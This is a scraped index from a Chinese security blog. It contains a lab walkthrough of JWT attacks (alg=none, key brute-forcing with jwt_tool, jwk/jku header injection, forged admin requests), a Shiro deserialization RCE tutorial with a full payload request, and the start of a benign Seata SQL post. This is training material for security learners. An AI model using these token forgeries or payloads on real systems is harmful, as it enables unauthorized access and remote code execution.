\u0026#34;username\u0026#34;: \u0026#34;Lsec\u0026#34;, \u0026#34;exp\u0026#34;: 1735428521 //时间戳 } signature部分 signature的功能是保护token完整性。\n生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。\n抽象成公式就是\n1 signature = HMAC-SHA256(base64urlEncode(header) + \u0026#39;.\u0026#39; + base64urlEncode(payload), secret_key) 值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充\u0026quot;=\u0026ldquo;号，并将标准Base64中的\u0026rdquo;+\u0026ldquo;和\u0026rdquo;/\u0026ldquo;分别改成了\u0026rdquo;-\u0026ldquo;和\u0026rdquo;-\u0026quot;。\nPython生成Token 1 2 3 4 5 import jwt encoded_jwt = jwt.encode({\u0026#39;user_name\u0026#39;: \u0026#39;admin\u0026#39;}, \u0026#39;key\u0026#39;, algorithm=\u0026#39;HS256\u0026#39;) print(encoded_jwt) print(jwt.decode(encoded_jwt, \u0026#39;key\u0026#39;, algorithms=[\u0026#39;HS256\u0026#39;])) Java生成Token 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // 生成JWT @Test public void TestJwt(){ Map\u0026lt;String, Object\u0026gt; claims = new HashMap\u0026lt;\u0026gt;(); claims.put(\u0026#34;id\u0026#34;,1); claims.put(\u0026#34;name\u0026#34;,\u0026#34;Lsec\u0026#34;); String jwt = Jwts.builder() .signWith(SignatureAlgorithm.HS256, \u0026#34;Lsec\u0026#34;) //签名算法 .setClaims(claims) //载荷 .setExpiration(new Date(System.currentTimeMillis() + 3600 * 1000)) //设置令牌有效期为1小时 .compact(); System.out.println(jwt); } // JWT令牌解析--还原JWT令牌数据 @Test public void testParseJwt(){ Claims lsec = Jwts.parser() .setSigningKey(\u0026#34;Lsec\u0026#34;) //密钥 .parseClaimsJws(\u0026#34;eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiTHNlYyIsImlkIjoxLCJleHAiOjE3MzE5NDY4ODZ9.WKZnuIlIKcOwaKIpt_pkQR5nIRtrDOByXyI8TCsJCcw\u0026#34;) .getBody(); System.out.println(lsec); } Jwt常出现的问题 https://portswigger.net/web-security/all-labs#jwt Burp靶场\nhttps://mp.weixin.qq.com/s/C1YDIKXOw7atNyefbe2TJg 靶场解题攻略\n通过未经验证的签名绕过 JWT 身份验证 使用wiener:peter进行登录，发现网站会返回JWT进行认证，使用JWT进行解密，替换sub字段\n直接修改字段网站可能会不显示，但是可以根据JWT的加密进行修改，payload部分有base64进行加密，只需要将payload部分提取出来进行解密即可\n访问删除连接成功删除用户\n通过有缺陷的签名验证绕过 JWT 身份验证 什么叫签名缺陷？有些JWT解密后确实存在加密算法，但是只需要将header中的alg更改为none即可绕过签名限制，将alg更改为none之后记得删除签名字段\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 GET /admin/delete?username=carlos HTTP/2 Host: 0a7400d804d7cc1e812212bc00bc00ed.web-security-academy.net Cookie: session=eyJraWQiOiI1NWJlZTNjNy04NjAxLTRhM2YtYjJjOC0xYzNiOTgwNmU4MTgiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5MDM4NSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers 通过弱签名密钥绕过 JWT 身份验证（爆破jwt密钥） 常见JWT爆破工具：jwt_tool 1 2 3 4 5 6 7 8 9 10 11 12 13 检查令牌的有效性测试已知漏洞： (CVE-2015-2951) alg=none签名绕过漏洞 (CVE-2016-10555) RS / HS256公钥不匹配漏洞 (CVE-2018-0114)密钥注入漏洞 (CVE-2019-20933/CVE-2020-28637)空白密码漏洞 (CVE-2020-28042)空签名漏洞 扫描错误配置或已知弱点 模糊声明值以引发意外行为 测试机密/密钥文件/公共密钥/ JWKS密钥的有效性通过高速字典攻击识别弱键 伪造新的令牌标头和有效载荷内容，并使用密钥或通过其他攻击方法创建新签名 时间戳篡改 RSA 和 ECDSA 密钥生成和重建（来自 JWKS 文件） 1 2 3 4 #爆破JWT -d 指定自定义字典 python jwt_tool.py eyJraWQiOiI1ZDY0YmNiYy0zMzUxLTQ1YmUtYjkxNS04YWY4ZmRmZTkyMmMiL CJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5MTgyMiwic3ViIjoi d2llbmVyIn0.HCINz9uNuMWbIYjWXV5oUI2adMDT9yz6ETofdBTXE6A -C -d jwt-secrets.txt 爆破出密钥为secret1，直接使用jwt.io在线编辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 GET /admin/delete?username=carlos HTTP/2 Host: 0a5e00f6036480bab9b18738008400b9.web-security-academy.net User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Sec-Websocket-Version: 13 Origin: https://0a5e00f6036480bab9b18738008400b9.web-security-academy.net Sec-Websocket-Key: JL91NnXespEIBGdR0it21A== Cookie: session=eyJraWQiOiI1ZDY0YmNiYy0zMzUxLTQ1YmUtYjkxNS04YWY4ZmRmZTkyMmMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5MTgyMiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.y4bodw8-TE3ImwJfCPMrR25Ax4l9CvKkOcEo55nhiz0 Sec-Fetch-Dest: empty Sec-Fetch-Mode: websocket Sec-Fetch-Site: same-origin Pragma: no-cache Cache-Control: no-cache Upgrade: websocket 通过 jwk 标头注入绕过 JWT 身份验证 JWT头部注入 如果服务器端使用一个非常脆弱的密钥，我们甚至有可能一个字符一个字符地来暴力破解这个密钥，根据JWS规范只有alg报头参数是强制的，然而在实践中JWT报头通常包含几个其他参数，以下是攻击者特别感兴趣的：\n1 2 3 jwk(JSON Web Key)：提供一个代表密钥的嵌入式JSON对象 jku(JSON Web Key Set URL)：提供一个URL，服务器可以从这个URL获取一组包含正确密钥的密钥 kid(密钥id)：提供一个ID，在有多个密钥可供选择的情况下服务器可以用它来识别正确的密钥，根据键的格式这可能有一个匹配的kid参数 下面我们介绍如何通过JWK参数注入自签名的JWT，JWS(JSON Web Signature)规范描述了一个可选的jwk header参数，服务器可以使用该参数以jwk格式将其公钥直接嵌入令牌本身，您可以在下面的JWT head中看到具体的示例\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;kid\u0026#34;: \u0026#34;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;jwk\u0026#34;: { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m\u0026#34; } } Burp靶场演示：Burp安装个JWT Editor插件\u0026mdash;生成一个New RSAKey\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;p\u0026#34;: \u0026#34;8J0fgpxQpZOvPGb2rRsJB6Bh0lgvxRtp_Ilc7NmpI3UgEUiArSey091pT3X6lIPRZLdMf_eeYo_PWh5aq79Ps_xoZHtAz4VrR9sR8tCkND-z0KKBmopkUrowJie368xoWDU53P-4qxEfCfqPPxoZZRzhE7cse0PUVayNAJC01FU\u0026#34;, \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;q\u0026#34;: \u0026#34;1zMkdJNLYEdZYvZ31B15CmCfI9dOGEpn6lyXOEBPsqrP554x_8dXZnXSHbybiYyeLgl6i_JubJBqjeSAejwHh9v-e3-R9-7Dgg4lB_OUNqsg7yM3mcpZn7IHeGVKj9BjhigWsbUXFuwM1iEDK4TDmTV4-tO9UMsIBQA1SFlUTA8\u0026#34;, \u0026#34;d\u0026#34;: \u0026#34;Ayw2AASn_yn6EwjqCts6_gP6NZ9BlNhCG1iuDTX9h_AGWYBtUepdgp4CaM098ZyjH2Da3RvonFVlTOwHTgVAdkb2eWqeMejMjUji3cKIQRU_r0UeY3C4q8BBuWjwzF7ZTeVDgbx05NfeUW0LwWE3mFBuPDy6tmvYdekcs8Ft7GDmU_ToPZaGnMoEKzVlMyDb82LgkB7qWw2H4UoXHWR0l_RS90gTjkJzMc4Fmu4CoPfmqw8jLnGgq8GhAzpecc-VLvqel3tSY0fKqF5Y3U2SooL27vJJxX0kLgHVbcTNvCcS8XZArdhWTekV923jtspoNDYn5HfhAlLglCcwQcOSYQ\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;fa018615-0392-4d15-89bb-a2c637d9adbd\u0026#34;, \u0026#34;qi\u0026#34;: \u0026#34;XO3HEFj8PCxFz4DIw0djHjTrW4Krm-Oim-U4bmuEdmPDKKTIYYvkPVoSRR-4kCHkCx2aDsraUbNkTyEYC4dRUbnWl6xr2HxaLZIsxOglYsa939l_m6NXSzttAGrPpWqoURT7t6ihSmBnGDJDsMS3c1gWJKZsAYkeXy5lI2IhGks\u0026#34;, \u0026#34;dp\u0026#34;: \u0026#34;0gfldIZsY0w5_9jE5LAfvreCDDGMaVsXtihVpC4PVXMs7clDAWMQ152DCqiqdi9mfar_LQkCCXkM_9ZVQWw675qZqXRpS3xj_BI_ZZw4aZ9dn_XqefLpxcjetL-g7US9pJm5i67xDOpiFLzRg7yNhFSkKCiRvHumAq8fWen23w0\u0026#34;, \u0026#34;dq\u0026#34;: \u0026#34;QcZI6zSmAjxsjrnkcDm96DUWDv9cyEHdtx0rvy6w7VwWBaYthA8qoI98dEhUhdsr8chF44Zqx9XwK4Re3H2Ck7zi8F5SgCRDL3ohSWfisj7l5xGtidz2PcBNVjgnbQN1l-ii3xgJgaEOX1hhvqhqnGZins-e-pXD0rt4ja93-3M\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w\u0026#34; } 抓包，将attack和sign都设置为新签名，修改payload越权到administrator即可\n通过 jku 标头注入绕过 JWT 身份验证 有些服务器可以使用jku(jwk Set URL)头参数来引用包含密钥的JWK集，而不是直接使用JWK头参数来嵌入公钥，当验证签名时，服务器从这个URL获取相关的密钥，这里的JWK集其实是一个JSON对象，包含一个代表不同键的JWK数组，下面是一个简单的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 { \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;75d0ef47-af89-47a9-9061-7c02a610d5ab\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ\u0026#34; }, { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw\u0026#34; } ] } 通过算法混淆绕过 JWT 身份验证 算法混淆攻击(也称为密钥混淆攻击)是指攻击者能够迫使服务器使用不同于网站开发人员预期的算法来验证JSON web令牌(JWT)的签名，这种情况如果处理不当，攻击者可能会伪造包含任意值的有效jwt而无需知道服务器的秘密签名密钥 JWT可以使用一系列不同的算法进行签名，其中一些，例如:HS256(HMAC+SHA-256)使用\u0026quot;对称\u0026quot;密钥，这意味着服务器使用单个密钥对令牌进行签名和验证，显然这需要像密码一样保密\n","date":"2025-06-10T22:40:26+08:00","image":"https://lserein.github.io/p/jwt%E6%94%BB%E9%98%B2/jwt_hu_e133807af62d3807.jpg","permalink":"https://lserein.github.io/p/jwt%E6%94%BB%E9%98%B2/","title":"JWT攻防"},{"content":"1.Shiro框架介绍 shiro反序列化详解（多个复现场景），看完就是赚到\nApache Shiro 是一个强大且灵活的安全框架，主要用于身份验证、授权、加密和会话管理。它可以帮助开发者轻松地实现用户权限控制，确保应用程序的安全性。\nApache Shiro反序列化漏洞分为两种：Shiro-550、Shiro-721\n2.漏洞产生原理 Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。 **在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 ** 那么，Payload产生的过程： 命令=\u0026gt;序列化=\u0026gt;AES加密=\u0026gt;base64编码=\u0026gt;RememberMe Cookie值 数据\u0026mdash;\u0026ndash;\u0026gt;序列化\u0026mdash;\u0026ndash;\u0026gt;aes加密\u0026mdash;\u0026mdash;\u0026gt;base64\u0026mdash;\u0026mdash;\u0026gt;存储再rememberMe中rememberMe\u0026mdash;\u0026mdash;\u0026ndash;\u0026gt;base64解码\u0026mdash;-\u0026gt;aes解密\u0026mdash;\u0026mdash;\u0026gt;反序列化 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。 3.漏洞影响版本 Shiro-550： Apache Shiro \u0026lt; 1.2.4\nShiro-721： Apache Shiro = 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1\n4.漏洞挖掘思路 4.1.黑盒挖掘 由于Shiro是一个身份验证，授权加密的框架，所以常出现点就是在登录框，在登录的时候抓包，看Cookie字段是否存在RememberMe等字段，或使用burp的一些被动扫描插件判断是否使用了Shiro框架\n当发现使用Shiro框架后，就可以使用一把梭工具进行测试是否存在Shiro漏洞\n爆破密钥，检测利用链\n1 2 3 4 5 6 7 8 9 10 GET / HTTP/1.1 Cookie: rememberMe=jFrHGFXD5Q5sM/yOgkydUbyDt73f4CBgu16niC9bwqnLyatxs3ZgGCg0TFA+8oGOpaOwNCqd36iVBsveR6MV48dtAOixjaaGO0hJMnW+robxDIHuuUU+fVIGadv5P/ZpQvpE9PpMyi4DFH6q7U+1wlFL29ixF7lMhJ2Y2gInrKKYCrYLX9mQZqjDMVK5AKKe/skhiKEiNnguQaNBVLp311/SgdNqmbsF5erYAKgdW4ZafFX7P0npigQ0O7DjugPc0O9lGl9Y6M2VdA9oFmmh6gFwoX6qYE7wsKr+qMXfti6zKjeWLJKca7d0acr+NPbBjIyY8LueihMPyO6H8hXZ+JrDMf92mxKYIIXKTClRqa5hi6294FVZ6Y1ziqkRSZ3/5yqjXYUk/ls3xUA0uKxs97M184zwRmPq+TTTn0rD6thkEIcMJA2mQ1m9rmQKVxAwoAc7OFIyfgU5CEC3MZd5IfI3IFVdg9YXtHhpy6dEX5QRI+OowQzgeLAYXduQdBymHa3RjR2IDO8l587bHNipkZ24OlVUp5TFpKT7AiYNUBUTbVbRV33452LIROi1/+dQoyZ/Phjr8Sbd/MV8VScFijOZ/IlPLNdjIOts1GSx8N5BPd1ZWe6PQL3L3haW4RMVvVRJu75eHcyRStsRV6WuE4yWWP6VErNzpVuRjuEUtZQU5O4/Fvgr+LEFORd4OHLggG+cvpGlIdxlZP4dbJKHj8edaV1Oz967EEH48ykHz5Yg/75I75SHP/PlXd62nkR4zZs/CIUQXYzH3IsopzMR1vDlrAqJHM4GdNXu96QHx1DPcO7knGn/CMHMetZ2VoV36W/hqE7687sMx9kAPtz5GqECnltUzY3OIJZ6pG6h6Tp325hfC6oAmaVGB/NgT2vGgvRPopBq4jat+kHKRqSCKsrvWLLJHvfvDDJM1n/KUhXLS/aaLTxiRv9/UJmwCyRnIFwMoTUq5TAkRlwgA/xQHVLnxmggb9HbiJA4NMDWvzfNprGFx31zeU4TEvnoHbdnSNj3lHKfUIfUcjN4LpLs2C7mUfHyPXZJpcJ7ubgnOaS/ReLIQohFQmhJtET5r5MAeSwgNUREb74yBnZlRweBKqG322zHGGKfZ7u7V0a+riGjUuk6RJcjdUgrlFAOWtfzeNJNgH60WRKG+CZReX0sRg1zREp5WTiwI1kjEQxLVPsVE32NiU+YiMsALk/x6NgcEssiqSZ3qqOlBLO0dxhyXNuL08IXuwnIsFwwpm75CUV9r4WiKIjOzW6LfwBxVpiaCMDhOQfK47m3lK7/sowuWDLtgIIqbGxGlE/3wbrmaRC7kGbXMlo1JNG+d1rd2Tio8BFZc0Eiww0jnxa56U95i2YCtC1fLcQCeKlDxPKt8Ve/PS0BmNvtTNRs9L6zu6P1jOpaY0S/4KqUrmIA64C57j7JnFqX1B4uwBtQFmc4/XqKyJ6rhngQs9a1pjSvG3bveU2eTeab32W4Q0f5yJKq47tk4nENJo5b6+GgTECTRVWnuXukM3sVZAWWYhfTG9xJk53UnxKEDZWyXFItsc6GpuynMyukBJ3hJLUZfb2ET4hFERQHfkG1/2HiORjlVy0a09qhSuGgc5NMg1E6JO/Vu3QQVG3HdG72Ma1X1EsaI3h0Zze4+ben28QUnl2YPdnPlJkbJJt5aErs5dtPKphvLLPuKobmIfLSGRa9ZfGnKUyTeJcfcA9Rq+tA9r0/vE0f+nbAu3rqQW20nRsuUSM70Xik01eVegqZtJhBbAK2J3QFPxo44kATTNj1LSJIhvOlX5BKGSlorPqV/59CYdE8/Kx1SN5axvFxlgO0TKoJSGpgEtzE+wCyn3uVNiLFflHAkE4fKuQxTVTCtX5Nw4SNuKvLobQyiaD75tt8VMWrpV6rv3/eER45If8tQ2jqNhyXXVyFXCIw5YBcVIaknTfIjtT3E2HJiu45Bu9vQ12/Qdu1JI8miRggcVvybn66LlZoi4qoWVBpdk4mb8GTTSPuo/bqPqFZ5xTV8aN4gKeXWWQHC5XZOeQRydSt+QlKYZD5j/zyjvoVimR1a1rIaYd/ndV1987reD3o6vvv6MedyH/Zyxa8G8XbMt0JQl3/KyxD6/o7ceZnP+wqi3f2Xy5qn+pRdZ1Bsd0F/nIkQIu9Yi2156oiOKFhMICoPurJyDMWNX3juiE3cn54Cq8N2eGNKdW7gGz5iUDkbRRx74XYY5O34saFxTgwfRy1TFnIMJG1UuET2t5eDSrNLvEPgeOfpg5gHk9Wr932/1ONFhCjHVfRrJ6wqsAlX+Vqpqy0q0SoSlBO6o3+nR0VKDyNPaLIuGlP6UNwsO2Yq24c5xUIZ3dEBffQEdM/Vw38B0lM99b1Q95cga3+CYRS6aGb4CrtIWWr4vzZ1UIssS5Pg8DVKngTyFyuhON5qGRjWvlNSy5NDgCJM2PoAldXo2hLOT/jS1hABVXECw/4dFUBmrT+pZg8WT5QelGTfguOnKe/sigeLMDFC1//cbLZdOFXdgAd/7bFmJmtg7X9D2wtwnCePeptjLtDfTcyZw6XjlBAAdrI6IwbnrEjmGZkKcKH7qymWiy1DSM43rz+alNY5iOihvimdqS4zrnbeGO0vJ01IlD7at39t+wqbQ3rXtTM3CG9diWSQLWTj07qaN49r45WyXQC8Irqn0iKbCbbqlkSYt0VmxMuOwQH4EEdyuLtnaj6YR0ia4Gvsb8/8Zs0GcwsgNtcYNLyx2OWnqzfERYJprWoX56m63aM3WZSE66fokUMx2o5v0n9lr7qsPfgoHsEoEwzfWCG5l7ft3YdGQESCyJoCEnXg/O5aBnM3vW7wjDOMI6frq5fqKQ6eNxfO6YuWL1fj+EMWP71XIQ1eX/5SqsEpHdX8PFp04tewhOulP7nvYjUKLhG5FKevq858JCwzkM4vkeSd3mGpUE5oPCrIzKKEsd3rJ+Ly8BPWH1VKIQtzwrS5P2iBX26Ced4tv9ryxl8WA/laDUCLVdcB5JnT1vggw0JqMg3WCnkxUzuMcttDrEqaI4KeSmlduF6bhjln5XfmX2KbxSY1Y6zNbsZY6DbFuh73cZNCvn7sl4coiPkRtgCKTzx6cywGbV36WW6R5WAGZRtCgOo5wUj2iBK34mO/4c5Gzv69yWviWONBFSvyA9ut7lodInJNWrqAzjZqZf1e8Zu09PxRG6qBMbmNoN/sTQ6IxHGT2zJE0Tjyh8YHEkzbVvG224gfNWR22x5rzuUX7qbAgC1C3b+sATUrn/7PthEtbkZEB7ZkzHk4FVUnvtZSGvwKTPKwAuw0nuWb7quNu7OtytQVjLnwhtd53xb00AKXTh1wu6AYklM4bBnUvQUW3MD8kGVsnzysdii9mnHnM9DnJVsURHNQjqbwDMFmlLm2xWcG1g26hkuR/BeN5WmZ60oiLi5BECWH1mkmFHPAQjxWxdhvLU0AbS1GkoZn/RNHlcI3AdKUwMD1s8hKyxTXXUOMk1iBQ/0NX6X8+a42BrtrVRgGo6vflFpx2VasBWs4D+GFn7m+piuhWDOC3FZO8Vev8Mvkr06FRUzi/4QlJDH82h7pDWAQtVg/BMFiYJBUZipw5NgiLGpEyNkiW63trO2ukR3UZw5fodufsHzqF24jTLaR6tVosXOrR7K8qcFOZ73SkXHUt7SWd25fzUYnGlhklIko0r2KWOMQtDQtV6rOLg3CcRI5jwzUFO023cJBp35wApX5FIiiVQta/yZ+y7G5xIsj51pTQrbdTr8GSLsjkHfGvS855nJUY7aNfFiE9Pv6bPar5+825cmdup/xeX9VGsYQGZf5Czt1pZjE9HmmNDbHgZaF8JKcZeUTPzDL7+UoraJ4lx9z+miSWoqtrU1cuLwdIw2ysbE4hQlXvy/7/JR7v0xaESMfps7VOkEoUDTBGMQ9bfDVFwTb+3IhUj3jAAa7qHSjUAwgXdWvYXp0DGt4IE/Kknh/aioueoUcdH+4nmPbG4ml/eJ8d59PlyEW6kLIarMVFLAp50Illrlo7I9xour2SQ8JkpDKrJoEAR/ydAMOSc6uuXzbhdi+hU6tj4sPw3jTgrpiUrQ4UsqBzNqyPZgg4niDGMufQuJanfoEizvChvgIM7V0NCVIWkCIBwJ+0P9oVM/JSodFi+3Pp3eme2tCG7Pa4Je5VqhXElz2GTcvx/nhL07ah2XsEeZyt287I1O+5nMtXGman1L0A+73Ex1DFsBnX7kegCPo5qxQN0Jt3Fud4pUsS6nBCfuQwwuXSuvUfRsJ2srz3dpi4sm8Ot7AtFfIn/abXGgXsziwd7SNndYKsCmo5U4el/6izct3GRtj2DsSWhQyV6JqJwKEUvzob8TJat9Um1ezTQ8twnGyL906fyEAybcNQvYFmL2ZW7ch3y2zk5XJ55srynkOP3PT++cFRshO36rQ//KvzXmgq0PxD52eJcizNCmEF6FnA/m3WvVfRWV+DuNdH92lor8ieyTjsudlgDCgu9irQQ6PK6mjxVSkUtfqHfpZ6ssebd8gmMQgNSzC8Sqd20MyjCkOvj5B2GKX4GO3eiZf0/4JKCba1q+PXav3ra7CMRTpG5a8/gOQ6jEloyAg6VV60NWu/HOApmuhbimqeQ9QLppuadjy3W44G0TjymWjcxwe8CR0n/aWlU/EiZZlYX/ZE4/Mtxi7qypmTOMStY+KfBA8ECKVlvmV5xFfQokVeuV9P8euAJWu941xCr9bg/qfVO0z7ZQz+zCiDkl5eLkt86AT7ZEBsk4peYvfaTtiQZCPf7wIBKgt+sAIsO7t16Mkn8AnAF+dHXbALh30/Vk03oe7Kr0QRPCdeRaKalMlIEZu96b8kZu8j8QfGH5DQrAIa9obvc7AwRLydcGYeg+TclbaYEWNXlsyP8lpmxEkiolYSUgg6sQV1Vk+OaccloIu2xguJWP3+wjL/oz0SlOLOahxiIVoihB+aXRJc2epDi5Zw9FAiyEfPZVolp8NRXwE32fCjxoNms+IxB+bjV4AvJwjatbeWX8gZvBo4QYvRgoBMuUqBPghxWm1thj+ajOAcEV+tr4cnNzmlGKgw0HN426d2XvmugqobM4mBK7f2ANS3A6y1dIhu60W6+5N/Gs3X1zn7TXT0YviTkUH6KdDUGJeVsXDimuddTE11hckQ0xUtI1ceBBoGsY1F8wGTmNsaF9dODxhkv9xxBGtXQAZo8tb+h9J308bGzbekWZ+jJwNOuXoLdXmaiqvWPBQHE7Ihu44NHrKmlqYZaE4BhSL65p2mFhRfRkpcjHbITzSIVKQD8YOJxyzQFF6EJfoy5KZfQClzQVRjDT Authorization: Basic d2hvYW1p Accept: text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.8 Cookie: JSESSIONID=12D77B15B8ABEE32B592B283EB1D46AA Host: 192.168.165.252:8088 Connection: close 返回包内容为执行命令返回结果后base64加密的内容\n4.2.白盒挖掘 查看项目的pom.xml或依赖是否使用Shiro框架\nShiro版本是否是存在漏洞的版本，查看Shiro的AES加密密钥\nAES的密钥Key一般在项目的配置文件中，如果是默认的Key，那么项目的默认文件会找不到，而是在实现RememberMeManager的方法内，采用硬编码\n5.Shiro反序列化利用 5.1.Shiro550 影响版本：Apache Shiro \u0026lt; 1.2.4\n可以看到Shiro版本为1.2.4时，默认AES加密Key是硬编码在代码中的\n注意：如果手动打的话，要删除掉数据包中的sessionId，如果数据包中存在SessionId，那么就不会读取RememberMe\n5.2.Shiro721 Shiro-721： Apache Shiro = 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1\n但当Shiro版本为1.2.4以上时，AES加密Key采用随机生成的方式\n因为shiro721用到的加密方式是AES-CBC，而且其中的ase加密的key基本猜不到了，是系统随机生成的。而cookie解析过程跟cookie的解析过程一样，也就意味着如果能伪造恶意的rememberMe字段的值且目标含有可利用的攻击链的话，还是能够进行RCE的。\n使用工具进行爆破，发现爆破失败\nShiro721是使用 登录后rememberMe= {value}去爆破正确的key值 进而反序列化，shiro721 本质上是 padding attack，爆破要弄很久很久。对比Shiro550条件只要有 足够密钥库 （条件较低）、Shiro721需要登录（要求较高 ）。\n6.Shiro反序列化分析 shiro反序列化初入\n反序列化学习之路-Shiro550\n反序列化学习之路-Shiro-721 分析\n","date":"2025-06-10T15:06:06+08:00","image":"https://lserein.github.io/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Shiro_hu_97a7258629bde61d.jpg","permalink":"https://lserein.github.io/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Shiro反序列化"},{"content":"为什么要学习分布式事务Seata？ 场景：在微服务架构中，一个业务操作可能涉及多个服务的数据库（如订单服务、库存服务、支付服务），传统事务无法跨服务保证原子性（ACID 中的 Atomicity）。\nSeata 通过抽象事务协调、资源管理和模式支持，解决了微服务架构下分布式事务的核心痛点，帮助开发者在保证数据一致性的同时，兼顾性能和开发效率。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 CREATE DATABASE IF NOT EXISTS `storage_db`; USE `storage_db`; DROP TABLE IF EXISTS `storage_tbl`; CREATE TABLE `storage_tbl` ( `id` int(11) NOT NULL AUTO_INCREMENT, `commodity_code` varchar(255) DEFAULT NULL, `count` int(11) DEFAULT 0, PRIMARY KEY (`id`), UNIQUE KEY (`commodity_code`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; INSERT INTO storage_tbl (commodity_code, count) VALUES (\u0026#39;P0001\u0026#39;, 100); INSERT INTO storage_tbl (commodity_code, count) VALUES (\u0026#39;B1234\u0026#39;, 10); -- 注意此处0.3.0+ 增加唯一索引 ux_undo_log DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` 